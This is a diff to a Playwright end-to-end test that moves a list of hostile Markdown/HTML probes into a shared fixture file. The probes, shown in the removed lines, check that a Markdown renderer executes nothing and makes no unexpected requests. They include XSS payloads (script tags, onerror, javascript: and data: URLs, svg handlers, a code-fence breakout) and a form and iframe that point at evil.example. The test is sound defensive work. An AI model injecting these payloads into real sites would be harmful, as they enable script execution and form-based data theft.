@@ -17,6 +17,7 @@
 // page.waitForTimeout is BANNED — auto-waiting locators only.
 
 import { test, expect } from "./fixtures/cortex-server.ts";
+import { HOSTILE } from "./fixtures/markdown-probes.ts";
 
 async function seedLane(url: string, name: string): Promise<void> {
   const r = await fetch(`${url}/api/lanes`, {
@@ -36,51 +37,6 @@ async function seedTask(url: string, lane: string, title: string, body: string):
   if (!r.ok) throw new Error(`failed to seed task: ${r.status} ${await r.text()}`);
   return r.json();
 }
-
-const HOSTILE = [
-  "# Hostile document",
-  "",
-  '<script>window.__pwned = "script"</script>',
-  "",
-  '<img src="x" onerror="window.__pwned = \'onerror\'">',
-  "",
-  '<a id="js" href="javascript:window.__pwned=\'js-url\'">js link</a>',
-  "",
-  '<a id="data" href="data:text/html,<script>window.__pwned=1</script>">data link</a>',
-  "",
-  "<style>body { display: none !important; }</style>",
-  "",
-  '<form action="https://evil.example/steal"><input name="q" value="typed"><button>Send</button></form>',
-  "",
-  '<iframe src="https://evil.example/frame"></iframe>',
-  "",
-  '<div id="location">clobber attempt</div><img name="body">',
-  "",
-  '<svg onload="window.__pwned=\'svg\'"><script>window.__pwned="svg-script"</script></svg>',
-  "",
-  "<math><mi onclick=\"window.__pwned='math'\">x</mi></math>",
-  "",
-  "```mermaid",
-  "graph LR",
-  "  A-->B",
-  '</pre><script>window.__pwned="fence-breakout"</script><pre>',
-  "```",
-  "",
-  "Safe **emphasis**, a [relative link](/task/1), a [site](https://example.com) and <mailto@example.com>.",
-  "",
-  "| col | val |",
-  "| --- | --- |",
-  "| a   | 1   |",
-  "",
-  "- [x] done item",
-  "- [ ] todo item",
-  "",
-  "Literal angle brackets in source: `<>&` and see @1 for the ref.",
-  "",
-  "```js",
-  "console.log('<b>not html</b>')",
-  "```",
-].join("\n");
 
 test("hostile Markdown/HTML renders with NO execution, NO forbidden elements and NO unexpected requests", async ({
   url,
